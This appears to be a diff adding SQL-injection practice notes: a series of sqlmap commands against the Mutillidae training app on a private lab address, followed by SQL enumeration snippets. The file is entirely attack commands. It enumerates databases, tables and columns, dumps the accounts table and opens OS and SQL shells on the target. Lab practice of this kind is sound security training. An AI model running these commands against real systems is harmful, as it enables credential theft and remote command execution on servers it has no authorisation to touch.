@@ -1,0 +1,21 @@
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details"
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -dbs
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --current-user
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --tables -D owasp10
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --columns -T accounts -D owasp10
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -T accounts -D owasp10 --dump
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --os-shell
+
+sqlmap -u "http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --sql-shell
+**************
+current_user()
+user()
+database()
+
+select table_name from information_schema.tables where table_schema ='owasp10'
